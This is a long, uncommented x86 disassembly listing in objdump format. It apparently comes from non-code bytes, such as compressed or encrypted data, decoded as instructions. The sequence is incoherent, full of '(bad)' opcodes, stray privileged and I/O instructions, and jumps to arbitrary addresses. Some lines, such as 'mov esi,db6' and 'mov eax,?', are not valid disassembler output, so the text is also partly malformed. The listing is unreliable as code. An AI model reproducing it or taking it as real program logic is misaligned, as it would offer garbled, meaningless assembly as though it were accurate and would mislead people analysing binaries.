  411d1f:	sbb    bl,BYTE PTR [edx-0x6dad8bca]
  411d25:	cmp    ah,BYTE PTR ds:0x490e04ec
  411d2b:	dec    ecx
  411d2c:	xor    al,0x17
  411d2e:	rcr    DWORD PTR [ecx+0x17737a36],0x2b
  411d35:	fs bnd jns 0x411d9e
  411d39:	push   es
  411d3a:	jge    0x411d3b
  411d3c:	add    eax,DWORD PTR [eax+ecx*1+0x74399eb5]
  411d43:	pop    edi
  411d44:	scas   al,BYTE PTR es:[edi]
  411d45:	push   esi
  411d46:	daa    
  411d47:	mov    ah,0x83
  411d49:	xchg   esp,eax
  411d4a:	xor    esi,0x4fd573a4
  411d50:	push   ss
  411d51:	bound  esi,QWORD PTR [ebx+0x31]
  411d54:	jne    0x411cef
  411d56:	stc    
  411d57:	jge    0x411d51
  411d59:	xchg   esp,eax
  411d5a:	mov    edx,0x2f69706c
  411d5f:	xchg   esp,eax
  411d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d61:	enter  0x2265,0xf9
  411d65:	sbb    eax,0x9b3fda90
  411d6a:	jmp    0xc0c9:0x2b097906
  411d71:	cmp    DWORD PTR [ebp+0x2fda5932],ebx
  411d77:	jnp    0x411d01
  411d79:	xchg   edi,eax
  411d7a:	(bad)  
  411d7b:	hlt    
  411d7c:	push   cs
  411d7d:	loop   0x411dc0
  411d7f:	aam    0x40
  411d81:	loop   0x411d83
  411d83:	inc    esi
  411d84:	(bad)  
  411d85:	gs popf 
  411d87:	loop   0x411d2f
  411d89:	(bad)  [esi+0x21]
  411d8c:	mov    bl,0x55
  411d8e:	and    eax,0x6f98a84
  411d93:	pop    ebp
  411d94:	mov    ebx,DWORD PTR [eax-0x52]
  411d97:	sub    BYTE PTR [ebp-0x68205d9e],bl
  411d9d:	adc    esp,0x28b5c0a9
  411da3:	inc    edi
  411da4:	cmp    BYTE PTR [ebp-0xf448b40],dl
  411daa:	inc    edx
  411dab:	js     0x411d47
  411dad:	leave  
  411dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411daf:	bnd jb 0x411dcb
  411db2:	mov    ebx,0x11475e8e
  411db7:	dec    ebp
  411db8:	nop
  411db9:	pusha  
  411dba:	aam    0x6c
  411dbc:	and    bl,BYTE PTR [eax+0x50]
  411dbf:	sub    ah,BYTE PTR [edx-0x7dbc140e]
  411dc5:	cs je  0x411d68
  411dc8:	pop    edi
  411dc9:	not    DWORD PTR [edi+edx*1-0x32]
  411dcd:	jge    0x411da5
  411dcf:	clc    
  411dd0:	cmp    DWORD PTR [eax],0x36325828
  411dd6:	fild   QWORD PTR [edx+0x44]
  411dd9:	dec    ebp
  411dda:	imul   ecx,DWORD PTR ds:0x415f1428,0x20
  411de1:	fist   DWORD PTR ds:0x67de246e
  411de7:	lahf   
  411de8:	cs hlt 
  411dea:	xchg   ecx,eax
  411deb:	mov    ebx,0xb713b3da
  411df0:	sbb    BYTE PTR [ecx],bh
  411df2:	cvtdq2ps xmm4,XMMWORD PTR [edi+0x38]
  411df6:	xchg   edx,eax
  411df7:	mov    eax,ds:0xe25a0ea6
  411dfc:	icebp  
  411dfd:	sub    al,0x3b
  411dff:	dec    esp
  411e00:	xchg   esi,eax
  411e01:	imul   ecx,DWORD PTR [ebp+0x61],0xffffff87
  411e05:	sbb    al,ch
  411e07:	fiadd  DWORD PTR [edx-0x43]
  411e0a:	pop    esp
  411e0b:	or     eax,0xe3ab8508
  411e10:	fdivp  st(5),st
  411e12:	daa    
  411e13:	sub    al,0x6f
  411e15:	add    ebx,DWORD PTR [edi+0x38067168]
  411e1b:	mov    ch,0x2c
  411e1d:	pop    ss
  411e1e:	jge    0x411e3e
  411e20:	mov    ch,0x50
  411e22:	add    al,0x8d
  411e24:	fs lahf 
  411e26:	xchg   ecx,eax
  411e27:	pusha  
  411e28:	fistp  DWORD PTR ds:0x199b2816
  411e2e:	jle    0x411e76
  411e30:	fcomp  st(7)
  411e32:	jge    0x411e14
  411e34:	ss sbb al,0x15
  411e37:	adc    DWORD PTR [eax-0x23],0x1fc17ec7
  411e3e:	pop    edi
  411e3f:	popa   
  411e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e41:	(bad)  ds:0x1c6d381
  411e47:	jbe    0x411de8
  411e49:	les    ebp,FWORD PTR [ecx-0x10]
  411e4c:	or     ecx,0xffffffe1
  411e4f:	push   edi
  411e50:	aad    0x35
  411e52:	xchg   edi,eax
  411e53:	mov    esp,0x2c9299bf
  411e58:	jno    0x411e7b
  411e5a:	xor    dh,BYTE PTR [ebx]
  411e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e5d:	cwde   
  411e5e:	dec    ebx
  411e5f:	repz and al,0xdb
  411e62:	gs leave 
  411e64:	je     0x411e7d
  411e66:	xlat   BYTE PTR ds:[ebx]
  411e67:	loop   0x411e27
  411e69:	xor    al,0x97
  411e6b:	loop   0x411e83
  411e6d:	jecxz  0x411e39
  411e6f:	xchg   BYTE PTR [ecx],ah
  411e71:	(bad)  
  411e72:	xor    bl,BYTE PTR [ecx-0x4e]
  411e75:	mov    edi,ss
  411e77:	pop    es
  411e78:	and    eax,0xcfeddf8a
  411e7d:	pop    esi
  411e7e:	pop    edi
  411e7f:	cmp    al,0x0
  411e81:	xchg   BYTE PTR [ecx-0x14],dh
  411e84:	enter  0xa048,0xb9
  411e88:	mov    esp,0xa82fcaf6
  411e8d:	jg     0x411e4b
  411e8f:	cmp    al,0x2b
  411e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e92:	adc    DWORD PTR [ebx],0xf
  411e95:	mov    eax,0xe37f5142
  411e9a:	jne    0x411e25
  411e9c:	outs   dx,DWORD PTR ds:[esi]
  411e9d:	push   ecx
  411e9e:	sbb    al,0x3e
  411ea0:	retf   0xdb54
  411ea3:	xor    bl,BYTE PTR [eax+0x32]
  411ea6:	mov    bl,0xac
  411ea8:	out    0x2b,eax
  411eaa:	int3   
  411eab:	push   0x71786ad0
  411eb0:	sub    esi,DWORD PTR [esp+ecx*4]
  411eb3:	or     eax,0x26938eba
  411eb8:	push   ds
  411eb9:	std    
  411eba:	cmp    al,0xd7
  411ebc:	das    
  411ebd:	sub    esp,DWORD PTR [edx-0x1d]
  411ec0:	push   ecx
  411ec1:	xor    eax,DWORD PTR [ecx-0x790930c1]
  411ec7:	cmp    al,0xdd
  411ec9:	pop    edx
  411eca:	mov    esi,0xb099f4c7
  411ecf:	jle    0x411f25
  411ed1:	jecxz  0x411e7d
  411ed3:	leave  
  411ed4:	mov    edx,0x524475d0
  411ed9:	ror    bl,cl
  411edb:	xor    BYTE PTR [esi+0x26],bl
  411ede:	fsubr  DWORD PTR [ebx+eax*8]
  411ee1:	mov    ds:0xf9417ac,al
  411ee6:	jno    0x411ee5
  411ee8:	test   eax,0x79acc629
  411eed:	xor    al,0xa5
  411eef:	push   ecx
  411ef0:	mov    bl,0x98
  411ef2:	xchg   esi,eax
  411ef3:	inc    edi
  411ef4:	rol    DWORD PTR [ecx+edx*2+0x418b5754],0xeb
  411efc:	mov    DWORD PTR [ecx+0x66],edi
  411eff:	or     dl,dl
  411f01:	mov    bh,BYTE PTR [edi+edx*4-0x502fe73]
  411f08:	rcr    DWORD PTR [ecx+0x64],1
  411f0b:	adc    dh,bh
  411f0d:	xchg   esi,eax
  411f0e:	sub    eax,0xdaf84acb
  411f13:	adc    dh,0x5c
  411f16:	push   ecx
  411f17:	push   edx
  411f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f19:	and    BYTE PTR [ebp-0x7fa62589],dh
  411f1f:	mov    esi,db6
  411f22:	cmp    al,0x8c
  411f24:	scas   al,BYTE PTR es:[edi]
  411f25:	out    0xaf,eax
  411f27:	sbb    DWORD PTR [edx+esi*4+0x5d01552c],ebx
  411f2e:	fwait
  411f2f:	mov    eax,0xa26b74c2
  411f34:	rcl    BYTE PTR [ebx+ebx*2+0x134f58ff],0x12
  411f3c:	test   esp,edx
  411f3e:	push   es
  411f3f:	int    0x93
  411f41:	inc    ebx
  411f42:	mov    bl,BYTE PTR [esi+0x7e]
  411f45:	mov    ds:0xcb643620,eax
  411f4a:	or     DWORD PTR [edx+ebx*1],ebx
  411f4d:	sub    dh,dh
  411f4f:	scas   eax,DWORD PTR es:[edi]
  411f50:	loop   0x411f9c
  411f52:	aam    0xb0
  411f54:	ins    BYTE PTR es:[edi],dx
  411f55:	ret    0xaf19
  411f58:	or     esi,eax
  411f5a:	mov    BYTE PTR [eax-0x40644542],0xef
  411f61:	dec    ebp
  411f62:	stos   BYTE PTR es:[edi],al
  411f63:	sbb    DWORD PTR [ebp+eax*2+0x3a],esi
  411f67:	call   0xa1a9048b
  411f6c:	xchg   esp,eax
  411f6d:	nop
  411f6e:	sbb    eax,0xd019b05f
  411f73:	hlt    
  411f74:	inc    edx
  411f75:	sbb    eax,0x113685ca
  411f7a:	popf   
  411f7b:	add    BYTE PTR [edx-0x7b],ah
  411f7e:	in     eax,dx
  411f7f:	fisub  WORD PTR [esp+edx*8]
  411f82:	jns    0x411fa9
  411f84:	daa    
  411f85:	lea    esp,[eax+0xe]
  411f88:	xlat   BYTE PTR ds:[ebx]
  411f89:	cmp    DWORD PTR [esi+0x5e],esi
  411f8c:	xor    BYTE PTR [ebp+0x2b],ch
  411f8f:	xlat   BYTE PTR ds:[ebx]
  411f90:	scas   al,BYTE PTR es:[edi]
  411f91:	xchg   eax,edi
  411f93:	xor    DWORD PTR ds:0xf4605592,ebx
  411f99:	(bad)  
  411f9a:	pop    ebp
  411f9b:	jno    0x412017
  411f9d:	shr    DWORD PTR [edi],0x2a
  411fa0:	loop   0x411f78
  411fa2:	mov    edx,0x95ccb401
  411fa7:	lds    edi,FWORD PTR [ecx+eiz*8+0x510c0518]
  411fae:	xor    eax,0x7289d6d0
  411fb3:	mov    eax,?
  411fb5:	outs   dx,DWORD PTR ds:[esi]
  411fb6:	stos   BYTE PTR es:[edi],al
  411fb7:	js     0x412001
  411fb9:	pop    esp
  411fba:	dec    ebp
  411fbb:	stos   BYTE PTR es:[edi],al
  411fbc:	adc    BYTE PTR [esi-0x4],0x5a
  411fc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fc1:	push   es
  411fc2:	xchg   esp,eax
  411fc3:	and    BYTE PTR [ebx+eiz*4+0x65f5f65e],bl
  411fca:	aad    0xe5
  411fcc:	sahf   
  411fcd:	cmc    
  411fce:	mov    eax,ds:0xe7010dc3
  411fd3:	hlt    
  411fd4:	jb     0x411ff2
  411fd6:	fs add al,0xaf
  411fd9:	arpl   WORD PTR [ebp+0x21],bp
  411fdc:	cmp    DWORD PTR [edi+0x7d],ebp
  411fdf:	add    eax,0xc0482336
  411fe4:	popf   
  411fe5:	cs jns 0x411f98
  411fe8:	mov    ch,0xa3
  411fea:	adc    al,0x75
  411fec:	jecxz  0x412068
  411fee:	dec    esp
  411fef:	test   DWORD PTR [ecx-0x48596b9a],0x993ba0e6
  411ff9:	sub    ah,BYTE PTR [ebx-0x63db6a88]
  411fff:	sbb    al,0x64
  412001:	scas   al,BYTE PTR es:[edi]
  412002:	jnp    0x412030
  412004:	and    DWORD PTR [ecx+0x66],esi
  412007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412008:	(bad)  [eax+0x3ecfec7d]
  41200e:	fild   WORD PTR [ecx+0x2c]
  412011:	in     al,0x10
  412013:	call   DWORD PTR [ecx-0x53]
  412016:	inc    ebx
  412017:	int3   
  412018:	sub    eax,0x5db53af
  41201d:	cmp    al,0xcb
  41201f:	and    bh,ch
  412021:	xor    eax,0xd58d44d
  412026:	aad    0xf0
  412028:	xchg   esp,eax
  412029:	inc    esp
  41202a:	bound  ebx,QWORD PTR [edi-0x67]
  41202d:	and    ah,BYTE PTR ds:0x69c7f5fa
  412033:	sbb    eax,0xb40c1263
  412038:	add    esp,ebp
  41203a:	ret    0x235f
  41203d:	mov    ebx,DWORD PTR [edi+0x21542055]
  412043:	test   BYTE PTR [ebx+0x76aed68b],cl
  412049:	js     0x412059
  41204b:	push   edi
  41204c:	lahf   
  41204d:	dec    ebx
  41204e:	retf   
  41204f:	and    esp,0x84d30c10
  412055:	cwde   
  412056:	mov    WORD PTR [ebp+0x64],?
  412059:	mov    edi,0x51ddbaf4
  41205e:	adc    al,0x59
  412060:	push   0x76
  412062:	sub    DWORD PTR [eax+0x3248a40a],edi
  412068:	out    0x1f,al
  41206a:	push   ebx
  41206b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41206c:	xor    eax,ecx
  41206e:	stc    
  41206f:	adc    DWORD PTR [edx+0x1c],0xbadcbf57
  412076:	shl    DWORD PTR [esi],0xe9
  412079:	sbb    edi,DWORD PTR ds:0x80334cb3
  41207f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412080:	jecxz  0x41208e
  412082:	sbb    BYTE PTR [ecx+ebp*1+0x3a],dh
  412086:	jb     0x4120a3
  412088:	rcl    DWORD PTR [edx+0x5fe2924e],cl
  41208e:	cmp    ebp,DWORD PTR [ecx-0x19]
  412091:	sub    BYTE PTR [edx-0x6467e0f],dl
  412097:	out    dx,al
  412098:	mov    edi,0xf48dfefa
  41209d:	in     eax,dx
  41209e:	es in  al,0x90
  4120a1:	or     bh,bh
  4120a3:	adc    cl,cl
  4120a5:	out    dx,al
  4120a6:	sub    DWORD PTR [edi-0x4e],0x8a550354
  4120ad:	or     bl,bl
  4120af:	push   esi
  4120b0:	and    ch,BYTE PTR [edx+0x3b]
  4120b3:	daa    
  4120b4:	rcr    DWORD PTR [edi],cl
  4120b6:	js     0x4120c1
  4120b8:	mov    ds:0x4aef6d08,al
  4120bd:	adc    BYTE PTR [ecx-0x28],cl
  4120c0:	mov    cl,0x41
  4120c2:	ins    BYTE PTR es:[edi],dx
  4120c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120c4:	ins    BYTE PTR es:[edi],dx
  4120c5:	mov    cl,BYTE PTR [ebx-0x2a]
  4120c8:	mov    esi,DWORD PTR [edi-0x72]
  4120cb:	dec    edi
  4120cc:	mov    WORD PTR [edi+esi*4+0x47],ds
  4120d0:	sub    eax,0x23ee8540
  4120d5:	fadd   st,st(2)
  4120d7:	mov    ch,0xa3
  4120d9:	pop    esp
  4120da:	fbstp  TBYTE PTR [esi+0x75a56d8a]
  4120e0:	adc    DWORD PTR [esi+0x6486238e],esp
  4120e6:	ja     0x4120cf
  4120e8:	cmp    BYTE PTR [ebx],dh
  4120ea:	xor    DWORD PTR [eax+0x6f],edx
  4120ed:	mov    ds:0x4a10bcf7,eax
  4120f2:	clc    
  4120f3:	jo     0x412163
  4120f5:	(bad)
  4120f8:	jl     0x41213a
  4120fa:	int    0x1f
  4120fc:	lods   al,BYTE PTR ds:[esi]
  4120fd:	fdiv   QWORD PTR [edi-0xa]
  412100:	mov    DWORD PTR [ecx+0x506a40d9],esi
  412106:	xchg   esp,eax
  412107:	add    al,0x86
  412109:	jae    0x4120a4
  41210b:	out    0x4a,al
  41210d:	fnsave [eax+0x79cc93bb]
  412113:	or     eax,0x786a9746
  412118:	mov    ebp,0xff5e54b8
  41211d:	pop    esi
  41211e:	(bad)  
  412120:	addr16 push es
  412122:	inc    ebp
  412123:	popf   
  412124:	aas    
  412125:	jae    0x41211f
  412127:	inc    esi
  412128:	or     ah,dh
  41212a:	test   BYTE PTR [edi-0x25a8643e],0x96
  412131:	xchg   edi,eax
  412132:	dec    esi
  412133:	sbb    eax,0xa09ac33e
  412138:	hlt    
  412139:	ja     0x41213d
  41213b:	and    eax,0x3535170e
  412140:	adc    ebx,DWORD PTR [eax+0x37931123]
  412146:	jmp    0x412162
  412148:	repnz data16 repz hlt 
  41214c:	mov    esi,0xd599e889
  412151:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  412153:	or     BYTE PTR [esi],ah
  412155:	mov    dl,0x8a
  412157:	out    dx,al
  412158:	adc    BYTE PTR ds:0xfd3c18bd,dh
  41215e:	mov    esp,0xba41e703
  412163:	pop    es
  412164:	jne    0x4121e5
  412166:	mov    eax,0xb36452cf
  41216b:	cmp    DWORD PTR [edx+0x1e0993e6],0x4f89c83d
  412175:	jecxz  0x4121b0
  412177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412178:	jg     0x412196
  41217a:	popf   
  41217b:	loop   0x41214a
  41217d:	mov    edx,0x35cf63e4
  412182:	inc    esp
  412183:	sub    DWORD PTR [eax],ebx
  412185:	mov    DWORD PTR [ebx+eax*2],edi
  412188:	jnp    0x412208
  41218a:	int    0xce
  41218c:	dec    ecx
  41218d:	not    BYTE PTR [ebp-0x4132cbf]
  412193:	mov    dh,0x51
  412195:	sub    DWORD PTR [esi],esp
  412197:	sbb    eax,0x1a775bb4
  41219c:	push   ebp
  41219d:	push   0xffffffbc
  41219f:	sar    DWORD PTR [ecx],cl
  4121a1:	mov    bl,0xad
  4121a3:	aad    0xa2
  4121a5:	imul   edi,DWORD PTR [eax],0xffffffef
  4121a8:	jp     0x41214f
  4121aa:	xchg   ebp,eax
  4121ab:	rcr    sp,cl
  4121ae:	les    edx,FWORD PTR [eax]
  4121b0:	mov    dh,0x97
  4121b2:	inc    ebp
  4121b3:	(bad)  
  4121b4:	mul    ebp
  4121b6:	test   DWORD PTR [edi-0x12be4be9],esp
  4121bc:	arpl   dx,cx
  4121be:	fsubrp st(5),st
  4121c0:	sbb    ah,BYTE PTR [edi-0x72]
  4121c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c4:	nop
  4121c5:	(bad)  [edx]
  4121c7:	or     BYTE PTR [edi],0x96
  4121ca:	(bad)  
  4121cb:	pop    ecx
  4121cc:	jmp    0x412153
  4121ce:	adc    ecx,DWORD PTR [eax]
  4121d0:	adc    DWORD PTR ds:0xeb6193c3,ebp
  4121d6:	mov    ds:0x4215e94b,eax
  4121db:	jecxz  0x41219a
  4121dd:	icebp  
  4121de:	in     eax,dx
  4121df:	into   
  4121e0:	stc    
  4121e1:	inc    ebx
  4121e2:	inc    ebx
  4121e3:	int3   
  4121e4:	mov    ds:0x1135a0c0,al
  4121e9:	push   ecx
  4121ea:	or     BYTE PTR [edx],dh
  4121ec:	leave  
  4121ed:	and    al,0xeb
  4121ef:	in     al,dx
  4121f0:	mov    BYTE PTR [eax-0x72742276],cl
  4121f6:	into   
  4121f7:	cmp    DWORD PTR [ebp+eiz*8-0x5c],ecx
  4121fb:	sahf   
  4121fc:	in     eax,dx
  4121fd:	es push edx
  4121ff:	call   0x12c:0x3f426f7c
  412206:	arpl   WORD PTR [ebp-0x6b98f049],cx
  41220c:	test   BYTE PTR fs:[ecx+0x5ea323e3],cl
  412213:	pop    eax
  412214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412215:	(bad)  
  412217:	mov    edx,0x6aec15e0
  41221c:	jb     0x4121a0
  41221e:	outs   dx,DWORD PTR ds:[esi]
  41221f:	fiadd  DWORD PTR [ebx+0x17f6325d]
  412225:	iret   
  412226:	jns    0x4121d1
  412228:	outs   dx,DWORD PTR ds:[esi]
  412229:	sub    ah,BYTE PTR [ecx+ebp*4-0x66]
  41222d:	mov    ds:0x8cf4f333,al
  412232:	dec    esi
  412233:	daa    
  412234:	push   ss
  412235:	mov    ds,WORD PTR [eax+0x1dec77b2]
  41223b:	inc    ecx
  41223c:	or     al,BYTE PTR [ecx]
  41223e:	or     esi,esi
  412240:	pop    es
  412241:	cli    
  412242:	push   ebp
  412243:	(bad)  
  412244:	not    edi
  412246:	lea    ebx,[ebx+0x5f14a323]
  41224c:	outs   dx,BYTE PTR ds:[esi]
  41224d:	sbb    BYTE PTR [ebx-0x6f],bl
  412250:	inc    eax
  412251:	cdq    
  412252:	ret    
  412253:	fistp  QWORD PTR [ecx]
  412255:	loopne 0x412240
  412257:	sbb    bl,BYTE PTR [eax-0x2f]
  41225a:	and    eax,0x3bd8c9d0
  41225f:	mov    dh,0xb5
  412261:	xchg   ecx,eax
  412262:	add    DWORD PTR [ecx],ebp
  412264:	adc    DWORD PTR [edx-0x52aa33c8],esi
  41226a:	in     eax,dx
  41226b:	dec    eax
  41226c:	not    BYTE PTR [edi]
  41226e:	mov    sp,0xfc83
  412272:	enter  0x4c5f,0xf5
  412276:	mov    edx,0x87eca88c
  41227b:	dec    ebp
  41227c:	outs   dx,BYTE PTR ds:[esi]
  41227d:	and    eax,0x399bd0aa
  412282:	jge    0x412237
  412284:	test   al,0xd8
  412286:	mov    dl,0x2a
  412288:	shl    BYTE PTR [edx+0x35],0xd3
  41228c:	push   0xc3e7684f
  412291:	fild   DWORD PTR [ebx+0x69]
  412294:	xchg   edi,eax
  412295:	xor    esp,DWORD PTR [esi+0x7aa6298a]
  41229b:	(bad)  
  41229d:	ja     0x412241
  41229f:	sub    eax,0xf88e58ad
  4122a4:	dec    edx
  4122a5:	add    al,0xff
  4122a7:	es xchg ebx,eax
  4122a9:	jo     0x412315
  4122ab:	pusha  
  4122ac:	cmp    ebp,ecx
  4122ae:	repz icebp 
  4122b0:	fisub  WORD PTR [eax+0x2b]
  4122b3:	push   edi
  4122b4:	leavew 
  4122b6:	dec    edx
  4122b7:	scas   al,BYTE PTR es:[edi]
  4122b8:	mov    edi,0x420c1cbb
  4122bd:	test   al,0x38
  4122bf:	or     al,0x15
  4122c1:	(bad)  
  4122c3:	test   eax,0x1ff6f241
  4122c8:	ret    0x46b2
  4122cb:	cmp    ebx,DWORD PTR ds:0x3e042b1d
  4122d1:	loop   0x41229c
  4122d3:	out    0x4b,eax
  4122d5:	inc    ecx
  4122d6:	xchg   BYTE PTR [edi],ch
  4122d8:	pop    eax
  4122d9:	or     al,BYTE PTR [ebp-0x74]
  4122dc:	cmp    al,0x7c
  4122de:	in     eax,dx
  4122df:	inc    edi
  4122e0:	sahf   
  4122e1:	sub    eax,0xc553c22b
  4122e6:	add    eax,0xe2bc3008
  4122eb:	sub    eax,0x92454d8f
  4122f0:	xor    BYTE PTR [ebx],dh
  4122f2:	loope  0x4122e2
  4122f4:	push   0x3bb82677
  4122f9:	loope  0x412376
  4122fb:	sub    al,0xe9
  4122fd:	gs repnz mov al,0x14
  412301:	(bad)  
  412302:	pop    esi
  412303:	not    DWORD PTR [ecx-0x4a0e2437]
  412309:	lahf   
  41230a:	(bad)
  41230e:	icebp  
  41230f:	add    al,0x1b
  412311:	sbb    DWORD PTR [edx-0x1d],esi
  412314:	mov    ebp,0xcf057151
  412319:	cmp    eax,0x3a54d408
  41231e:	jo     0x412369
  412320:	or     al,al
  412322:	push   0xffffffec
  412324:	mov    ds:0x8df55f52,eax
  412329:	mov    ecx,0xf11ae997
  41232e:	test   eax,0xe046481d
  412333:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412334:	jecxz  0x41233f
  412336:	pop    eax
  412337:	pop    esi
  412338:	or     BYTE PTR [ebx+0x44bfaa47],ch
  41233e:	aam    0x5c
  412340:	test   al,0x97
  412342:	stc    
  412343:	pop    esi
  412344:	nop
  412345:	ss mov bh,0x1e
  412348:	test   BYTE PTR [ecx-0x554205de],ah
  41234e:	fld    TBYTE PTR [esi+0x57]
  412351:	lea    esi,[edx-0x3a30f2ea]
  412357:	cdq    
  412358:	fld    QWORD PTR [ebx-0x67]
  41235b:	jmp    0x4123a8
  41235d:	cli    
  41235e:	sub    ah,ah
  412360:	fidiv  DWORD PTR [edx-0x78]
  412363:	push   ss
  412364:	retf   
  412365:	rcl    BYTE PTR [esi+0x6e732019],cl
  41236b:	pusha  
  41236c:	(bad)  
  41236d:	ss pop ds
  41236f:	xchg   ebp,eax
  412370:	js     0x41233e
  412372:	pushf  
  412373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412374:	cmp    ch,al
  412376:	popf   
  412377:	mov    bh,cl
  412379:	scas   eax,DWORD PTR es:[edi]
  41237a:	xchg   DWORD PTR [ebx-0x53],ebp
  41237d:	jmp    0x412309
  41237f:	xchg   esi,eax
  412380:	sub    cl,al
  412382:	pop    ecx
  412383:	push   ebp
  412384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412385:	xchg   ebx,eax
  412386:	push   ds
  412387:	imul   edi,DWORD PTR [edi+0x3],0xa72231ff
  41238e:	call   0x81d4420f
  412393:	inc    ebp
  412394:	pushf  
  412395:	daa    
  412396:	push   eax
  412397:	jne    0x4123f3
  412399:	jae    0x412382
  41239b:	adc    al,0x1f
  41239d:	push   0x6a
  41239f:	mov    edx,DWORD PTR [ecx+eax*4-0x4d]
  4123a3:	lds    edi,FWORD PTR [eax-0x436f38ca]
  4123a9:	mov    ds:0xdf395a01,al
  4123ae:	ins    DWORD PTR es:[edi],dx
  4123af:	push   ecx
  4123b0:	adc    al,0xc2
  4123b2:	ss xchg edx,eax
  4123b4:	pop    ebx
  4123b5:	fisttp DWORD PTR [ebp+0xe95abc6]
  4123bb:	xlat   BYTE PTR ds:[ebx]
  4123bc:	out    0x38,al
  4123be:	or     dl,dl
  4123c0:	inc    ebx
  4123c1:	and    eax,0x46a3fa53
  4123c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123c7:	mov    esp,ecx
  4123c9:	jle    0x412365
  4123cb:	jle    0x4123c1
  4123cd:	inc    esp
  4123ce:	or     BYTE PTR [ebx+edx*4],al
  4123d1:	outs   dx,BYTE PTR ds:[esi]
  4123d2:	inc    ecx
  4123d3:	cld    
  4123d4:	clc    
  4123d5:	retf   
  4123d6:	adc    eax,0x6f598ea7
  4123db:	rcl    esp,0x5
  4123de:	jbe    0x4123ac
  4123e0:	stc    
  4123e1:	loope  0x4123e7
  4123e3:	sbb    DWORD PTR [ebp-0x4cab2552],0xc730f40a
  4123ed:	push   ecx
  4123ee:	and    BYTE PTR [esi-0x76334c27],bh
  4123f4:	loopne 0x41239d
  4123f6:	sub    eax,0x9254da59
  4123fb:	ror    ecx,0xc7
  4123fe:	(bad)  [edx+0x7f]
  412401:	jmp    0x21164567
  412406:	fisttp WORD PTR [eax]
  412408:	mov    al,0xd0
  41240a:	cmp    DWORD PTR [ebx-0x60],ecx
  41240d:	out    0x9,al
  41240f:	or     al,0x19
  412411:	jo     0x41248c
  412413:	cld    
  412414:	sub    BYTE PTR ds:0xfcf5e901,al
  41241a:	ins    DWORD PTR es:[edi],dx
  41241b:	mov    dh,0x60
  41241d:	jmp    0xda2ee90f
  412422:	(bad)  
  412423:	ficom  WORD PTR [eax+0x36]
  412426:	cmp    bl,BYTE PTR [edi-0x33]
  412429:	xor    ebp,DWORD PTR [ecx]
  41242b:	gs loop 0x4123cc
  41242e:	xor    ebp,DWORD PTR [ecx+0x2c50ff07]
  412434:	sub    DWORD PTR [edx],0x94ed250f
  41243a:	dec    eax
  41243b:	stc    
  41243c:	outs   dx,BYTE PTR ds:[esi]
  41243d:	jmp    0xca3b7f8b
  412442:	cmp    dl,BYTE PTR [edi]
  412444:	(bad)  
  412445:	pop    ecx
  412446:	cwde   
  412447:	or     DWORD PTR [ecx],esp
  412449:	ret    
  41244a:	jae    0x4124b7
  41244c:	dec    edx
  41244d:	adc    al,0x29
  412450:	sti    
  412451:	(bad)  
  412452:	(bad)  [eax]
  412454:	pop    es
  412455:	stos   BYTE PTR es:[edi],al
  412456:	xor    edx,esp
  412458:	rcr    DWORD PTR [ebp-0x80],cl
  41245b:	fld    DWORD PTR [eax+eiz*4-0x70b91b2f]
  412462:	adc    ebx,ebx
  412464:	psubq  mm7,mm1
  412467:	sbb    DWORD PTR [ebx+0x3b],0xb
  41246b:	outs   dx,DWORD PTR ds:[esi]
  41246c:	push   ss
  41246d:	push   ebx
  41246e:	and    DWORD PTR [ecx+0x29],ebp
  412471:	fwait
  412472:	enter  0x34b0,0xd
  412476:	dec    ecx
  412477:	jmp    0x6431:0xcf530604
  41247e:	push   es
  41247f:	mov    eax,0x5e3e100f
  412484:	jge    0x4124db
  412486:	add    eax,0xfc08b381
  41248b:	js     0x41246e
  41248d:	mov    al,ds:0x76892ef0
  412492:	pop    ecx
  412493:	inc    edx
  412494:	add    cl,ch
  412496:	lds    ebx,FWORD PTR [esp+eax*1+0x7e]
  41249a:	add    BYTE PTR [edi+0x400a03f4],ah
  4124a0:	rcl    BYTE PTR [ecx],1
  4124a2:	fwait
  4124a3:	daa    
  4124a4:	jo     0x4124f3
  4124a6:	and    BYTE PTR [esi],dh
  4124a8:	lea    edi,[edi]
  4124aa:	adc    BYTE PTR [ebp-0xc4b03aa],bh
  4124b0:	ins    DWORD PTR es:[edi],dx
  4124b1:	jnp    0x4124bd
  4124b3:	cmp    esi,DWORD PTR [ebp-0x380e7faf]
  4124b9:	aad    0x5f
  4124bb:	and    DWORD PTR [ecx-0x30],ebp
  4124be:	sti    
  4124bf:	lds    esi,FWORD PTR [edi+0x699a547a]
  4124c5:	jge    0x41250d
  4124c7:	icebp  
  4124c8:	ins    DWORD PTR es:[edi],dx
  4124c9:	cld    
  4124ca:	sub    bh,BYTE PTR ds:0xf7f99655
  4124d0:	and    eax,0x486513b6
  4124d5:	mov    bl,0xe8
  4124d7:	(bad)  
  4124d8:	(bad)  
  4124d9:	mov    ebx,ecx
  4124db:	push   edx
  4124dc:	ja     0x4124cc
  4124de:	addr16 pusha 
  4124e0:	out    0xb3,al
  4124e2:	ficom  WORD PTR ds:0x803eecee
  4124e8:	outs   dx,BYTE PTR ds:[esi]
  4124e9:	mov    esi,0x9be48c89
  4124ee:	fistp  QWORD PTR [ebp+0x61a7778f]
  4124f4:	push   es
  4124f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124f6:	pop    ecx
  4124f7:	xchg   edx,eax
